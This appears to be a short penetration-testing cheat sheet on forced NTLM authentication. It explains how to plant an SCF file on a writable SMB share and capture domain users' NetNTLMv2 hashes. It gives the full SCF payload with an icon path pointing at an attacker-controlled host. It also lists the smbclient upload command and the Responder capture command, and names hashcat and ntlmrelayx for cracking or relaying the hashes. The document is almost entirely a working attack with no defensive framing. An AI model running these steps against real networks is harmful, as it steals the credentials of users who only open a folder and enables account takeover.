# SCF File on Writable Share NTLM Capture

An SCF (Shell Command File) placed in a writable SMB share auto-executes when a user opens the folder in Explorer — no click required.  
It forces the user's machine to authenticate to an attacker-controlled SMB server, capturing NetNTLMv2.

Create the SCF file:
```ini
[Shell]
Command=2
IconFile=\\<LHOST>\share\icon
[Taskbar]
Command=ToggleDesktop
```

Save as `@evil.scf` (leading `@` sorts it to the top of the directory listing).

Drop it into a writable share:
```bash
smbclient //<TARGET>/<SHARE> -U '<user>%<pass>'
smb: \> put evil.scf @evil.scf
```

Start Responder to capture the hash:
```bash
responder -I tun0 -wrf
```

When any domain user browses the share, their NetNTLMv2 hash is captured.  
Crack with hashcat mode 5600, or relay with ntlmrelayx.
